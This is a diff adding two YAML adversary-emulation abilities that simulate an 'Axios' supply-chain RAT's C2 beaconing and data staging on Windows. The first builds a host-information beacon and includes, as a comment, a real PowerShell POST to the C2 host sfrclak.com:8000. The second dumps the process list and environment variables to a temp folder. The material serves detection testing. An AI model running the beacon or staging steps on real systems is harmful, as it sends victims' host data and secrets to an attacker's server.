@@ -1,0 +1,91 @@
+---
+- id: 44444444-4444-4444-8444-444444444444
+  name: axios-c2-beacon-simulation
+  description: |
+    Simulates the C2 beacon behavior of the Axios supply chain RAT.
+    The real RAT beacons every 60 seconds to sfrclak.com:8000 over
+    HTTP using a fake IE8 User-Agent (mozilla/4.0 compatible; msie 8.0;
+    windows nt 5.1; trident/4.0). Beacons use Base64-encoded JSON with
+    16-character random alphanumeric session IDs over port 8000.
+    JARM fingerprint: 28d28d28d00028d00028d28d28d28d96d86b34e11c2d3d5508f7111adf9d91
+  tactic: command-and-control
+  technique:
+    attack_id: T1104
+    name: Multi-Stage Channels
+  platforms:
+    windows:
+      psh:
+        command: |
+          $c2Domain = "sfrclak.com"
+          $c2Port = 8000
+          $beaconInterval = 60
+          $ua = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"
+          $sessionId = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})
+          $beaconPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(@{
+            hostname = $env:COMPUTERNAME
+            username = $env:USERNAME
+            domain = $env:USERDOMAIN
+            os = [Environment]::OSVersion.VersionString
+            arch = $env:PROCESSOR_ARCHITECTURE
+            pid = $PID
+            session = $sessionId
+          } | ConvertTo-Json -Compress))
+          "[SIMULATED] === C2 Beacon Simulation ==="
+          "[SIMULATED] C2 endpoint: http://$($c2Domain):$($c2Port)/product1"
+          "[SIMULATED] User-Agent: $ua"
+          "[SIMULATED] Session ID: $sessionId"
+          "[SIMULATED] Beacon body (Base64 JSON): $beaconPayload"
+          "[SIMULATED] Beacon interval: every $($beaconInterval) seconds"
+          "[SIMULATED] JARM: 28d28d28d00028d00028d28d28d28d96d86b34e11c2d3d5508f7111adf9d91"
+          "[SIMULATED] Backup C2: callnrwise.com:$($c2Port)"
+          "[SIMULATED] === End C2 Beacon ==="
+          # Real beacon would be:
+          # Invoke-RestMethod -Uri "http://$c2Domain`:$c2Port/product1" -Method POST -Body $beaconPayload -Headers @{"User-Agent"=$ua} -TimeoutSec 10
+        cleanup: ""
+      cmd:
+        command: |
+          echo [SIMULATED] C2 beacon to sfrclak.com:8000/product1
+          echo [SIMULATED] User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
+  singleton: false
+  repeat: 1
+  requirements: []
+---
+- id: 44444444-4444-4444-8444-444444444445
+  name: axios-exfil-staging
+  description: |
+    Simulates staging of victim system data prior to C2 exfiltration.
+    The Axios RAT's rundir command exfiltrates directory contents.
+    This simulates staging of hostname, user, process list, and
+    environment variables to %TEMP% for later C2 pickup, matching
+    the data profile a real RAT would collect.
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    windows:
+      psh:
+        command: |
+          $stagingDir = "$env:TEMP\axios_exfil"
+          New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+          $hostnameFile = Join-Path $stagingDir "hostname.txt"
+          $usernameFile = Join-Path $stagingDir "username.txt"
+          $processFile = Join-Path $stagingDir "processes.txt"
+          $envFile = Join-Path $stagingDir "env.txt"
+          "$env:COMPUTERNAME" | Out-File -FilePath $hostnameFile -Encoding UTF8
+          "$env:USERNAME@$env:USERDOMAIN" | Out-File -FilePath $usernameFile -Encoding UTF8
+          Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize | Out-File -FilePath $processFile -Encoding UTF8
+          Get-ChildItem Env: | Select-Object Key, Value | Format-Table -AutoSize | Out-File -FilePath $envFile -Encoding UTF8
+          "[SIMULATED] Data staged to: $stagingDir"
+          "[SIMULATED] Files: hostname.txt, username.txt, processes.txt, env.txt"
+          "[SIMULATED] Ready for C2 exfiltration via sfrclak.com:8000"
+        cleanup: |
+          Remove-Item -Path "$env:TEMP\axios_exfil" -Recurse -Force -ErrorAction SilentlyContinue
+      cmd:
+        command: |
+          mkdir "%TEMP%\axios_exfil" 2>nul
+          echo %COMPUTERNAME% > "%TEMP%\axios_exfil\hostname.txt"
+          echo %USERNAME% > "%TEMP%\axios_exfil\username.txt"
+          echo [SIMULATED] Data staged to %TEMP%\axios_exfil
+  singleton: true
+  requirements: []
